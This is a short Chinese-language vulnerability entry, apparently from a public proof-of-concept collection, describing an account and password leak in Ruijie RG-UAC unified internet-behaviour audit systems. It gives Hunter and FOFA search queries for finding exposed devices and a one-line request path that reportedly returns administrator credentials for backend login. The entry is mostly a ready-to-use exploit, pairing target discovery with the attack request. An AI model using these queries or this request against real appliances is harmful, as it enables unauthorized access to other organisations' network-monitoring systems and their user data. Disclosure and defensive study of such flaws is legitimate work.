# 锐捷RG-UAC统一上网行为管理审计系统账号密码泄漏漏洞

# 一、漏洞简介
锐捷RG-UAC统一上网行为管理审计系统存在账号密码信息泄露,可以间接获取用户账号密码信息登录后台 。

# 二、影响版本
+ 锐捷RG-UAC统一上网行为管理审计系统

# 三、资产测绘
+ hunter`app.name="Ruijie 锐捷 RG-UAC"`
+ fofoa:`app="Ruijie-RG-UAC"`

登录页


# 四、漏洞复现
```plain
/get_dkey.php?user=admin
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/vfv3tndznm6x0igq>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
